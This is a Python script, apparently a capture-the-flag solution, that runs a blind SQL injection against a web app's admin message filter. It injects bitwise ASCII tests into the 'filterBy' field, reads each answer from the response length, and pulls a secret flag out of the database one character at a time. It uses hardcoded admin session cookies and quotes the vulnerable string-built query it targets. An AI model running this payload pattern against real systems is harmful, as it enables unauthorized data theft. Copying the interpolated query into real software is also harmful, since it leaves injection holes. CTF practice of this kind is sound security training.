import requests
import time

'''
    const clause = ` WHERE ${table}."${filterBy}" LIKE $${paramIndexStart}`;

    const query = `
        SELECT msgs.id, msgs.msg, msgs.type, msgs.createdAt, users.username
        FROM msgs
        INNER JOIN users ON msgs.userId = users.id
        ${clause || ""}
        ORDER BY msgs.createdAt DESC
        `;

    SELECT msgs.id, msgs.msg, msgs.type, msgs.createdAt, users.username FROM msgs INNER JOIN users ON msgs.userId = users.id WHERE ${table}."msg" LIKE '%meow%' ORDER BY msgs.createdAt DESC;
'''

def doThing(pos, bits):
# def doThing(word):
    host = 'http://me:3000'

    cookies = {
        '_csrf': 'cscavgI3RvVMOMK5W0V-z__k',
        'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Miwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzU5NzA5NzQwLCJleHAiOjE3NTk3MTMzNDB9.qLQ1t6mW5U2Gsej2rex3MB16JHBK8dwQ2dZyXabUq9o',
        # 'SRV': 's1-81a2224912765b542' # :/
    }
    data = {
        '_csrf': 'F74hLvY4-pobAK0DLrEE8iq3N5wMNBTpzeUpqe7yhzrSquwN0Ei0',
        'filterBy': f'''msg" LIKE '%meow%' and (select ascii(substring(flag from {pos} for 1)) & {bits} from flags)={bits} and msgs."msg''',
        # 'filterBy': f'''msg" LIKE '%meow%' and (select count(flag) from flags where flag like '{word}%')>0 and msgs."msg''',
        'keyword': 'meow'
    }
    print(f'{data['filterBy']}')
    r = requests.post(f'{host}/admin/msgs', cookies=cookies, data=data, allow_redirects=False)

    cl = r.headers['Content-Length']
    if cl == '864':
        return False
    if cl == '1011':
        return True
    else:
        print(f'{r.status_code=}')
        print(f'{r.headers=}')
        print(f'{r.text=}')
        print('Unexpected CL')
        exit()

charNum = 1
flag = ''
while True:
    c = 0
    for i in range(8):
        bits = 2**i
        r = doThing(charNum, bits)
        if r:
            print('yup :)')
            c = c ^ bits
        else:
            print('nope :(')

    charNum += 1
    flag += chr(c)
    print(f'{flag=}')
    if (flag.endswith('}')):
        exit()